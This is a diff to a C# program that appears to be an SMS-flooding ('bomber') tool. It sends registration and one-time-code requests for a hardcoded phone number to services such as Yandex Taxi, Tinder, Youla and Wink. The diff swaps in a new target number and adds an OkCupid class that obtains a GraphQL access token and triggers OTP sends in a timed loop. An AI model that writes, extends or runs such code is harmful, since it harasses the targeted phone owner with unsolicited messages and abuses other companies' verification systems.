@@ -10,7 +10,7 @@ namespace test
     {
         public static void Main(string[] args)
         {
-            string phone = "9201353575"; //without country code
+            string phone = "9622042968"; //without country code
 
             YandexTaxi yandexTaxi = new YandexTaxi(phone);
             Tinder tinder = new Tinder(phone);
@@ -21,19 +21,21 @@ namespace test
             YandexEda yandexEda = new YandexEda(phone);
             SalamPay salamPay = new SalamPay(phone);
             Wink wink = new Wink(phone);
+            OkCupid okCupid = new OkCupid(phone);
 
-            for (int i = 0; i < 1; ++i)
+            for (int i = 0; i < 5; ++i)
             {
-                yandexTaxi.SendYaTaxiPOST();
-                tinder.SendTinderPOST();
-                youla.SendYoulaPOST();
-                karusel.SendKaruselPOST();
+                //yandexTaxi.SendYaTaxiPOST();
+                //tinder.SendTinderPOST();
+                //youla.SendYoulaPOST();
+                //karusel.SendKaruselPOST();
                 //findclone.SendFindclone();
                 //belkaCar.SendBelkaCarPOST();
                 //yandexEda.SenYaEdaPOST();
                 //salamPay.SendSalamPayPOST();
-                wink.SendWinkPOST();
-                Thread.Sleep(000);
+                //wink.SendWinkPOST();
+                okCupid.SendOkCupidPOST();
+                Thread.Sleep(7000);
             }
         }
 
@@ -328,6 +330,67 @@ namespace test
             {
                 string json = "{\"phone\":\"" + phone + "\", \"action\":\"register\"}";
 
+                streamWriter.Write(json);
+            }
+
+            MainClass.ShowAnswer(request);
+        }
+
+        private static string phone, id;
+    }
+
+    class OkCupid //interval 10-15s
+    {
+        public OkCupid(string temp)
+        {
+            phone = "7" + temp;
+        }
+
+        public void GetOkCupidID()
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.okcupid.com/graphql");
+            request.ContentType = "application/json";
+            request.Method = "POST";
+
+            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+            {
+                string json = "{\"operationName\":\"authTSPAccessTokenCreate\",\"variables\":{},\"query\":\"mutation authTSPAccessTokenCreate {  authTSPAccessTokenCreate {    tspAccessToken    __typename  }}\"}";
+
+                streamWriter.Write(json);
+            }
+
+            var response = (HttpWebResponse)request.GetResponse();
+            using (var streamReader = new StreamReader(response.GetResponseStream()))
+            {
+                Stream receiveStream = response.GetResponseStream();
+                StreamReader readStream = null;
+                if (response.CharacterSet == null)
+                {
+                    readStream = new StreamReader(receiveStream);
+                }
+                else
+                {
+                    readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
+                }
+                id = readStream.ReadToEnd();
+                string searchID = "tspAccessToken\":\"";
+                int searchResult = id.IndexOf(searchID);
+                id = id.Substring(searchResult + searchID.Length, 153);
+            }
+        }
+
+        public void SendOkCupidPOST()
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.okcupid.com/graphql");
+            request.ContentType = "application/json";
+            request.Method = "POST";
+
+            GetOkCupidID();
+
+            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+            {
+                string json = "{\"operationName\":\"authOTPSend\",\"variables\":{\"input\":{\"tspAccessToken\":\"" + id + "\",\"phoneNumber\":\"" + phone + "\",\"platform\":\"web\"} },\"query\":\"mutation authOTPSend($input: AuthOTPSendInput!) {  authOTPSend(input: $input) {   success    __typename  }}\"}";
+                Console.WriteLine(json);
                 streamWriter.Write(json);
             }
 
